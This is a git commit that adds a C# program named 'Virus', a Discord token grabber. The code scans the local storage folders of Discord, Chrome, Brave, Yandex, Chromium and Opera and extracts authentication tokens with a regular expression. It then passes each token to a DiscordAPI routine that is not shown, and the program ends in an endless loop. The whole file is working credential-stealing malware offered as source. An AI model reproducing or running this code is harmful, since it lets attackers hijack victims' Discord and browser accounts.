723e3446028e4afa32da796096dd231742382343
mega <mega@DESKTOP-L8GJR60>
2022-02-22 17:52:07 +0200

    Add project files.

---
+++ Virus/Program.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+
+namespace Virus
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+
+
+
+            TokenGrabber();
+
+            while (true)
+            {
+
+            }
+
+
+
+        }
+
+        public static void TokenGrabber()
+        {
+           
+            var tokens = GetTokens();
+
+            Parallel.ForEach(tokens, token =>
+            {
+                DiscordAPI.main(token);
+
+            });
+            
+        }
+
+        public static List<string> GetTokens()
+        {
+            var paths = new Dictionary<string, string>();
+            var tokens = new List<string>();
+
+            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+
+            paths.Add("Discord", roaming + "\\discord");
+            paths.Add("Discord Canary", roaming + "\\discordcanary");
+            paths.Add("Discord PTB", roaming + "\\discordptb");
+            paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
+            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
+            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
+            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
+            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");
+
+            foreach (KeyValuePair<string, string> kvp in paths)
+            {
+                string platform = kvp.Key;
+                string path = kvp.Value;
+
+                if (!Directory.Exists(path))
+                    continue;
+
+                foreach (string token in FindTokens(path))
+                {
+                    tokens.Add(token);
+                }
+            }
+            return tokens;
+        }
+
+        public static List<string> FindTokens(string path)
+        {
+            path += "\\Local Storage\\leveldb";
+            var tokens = new List<string>();
+
+            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
+            {
+                string content = File.ReadAllText(file);
+
+                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                {
+                    tokens.Add(match.ToString());
+                }
+            }
+            return tokens;
+        }
+
+       
+    }
+
+}
+
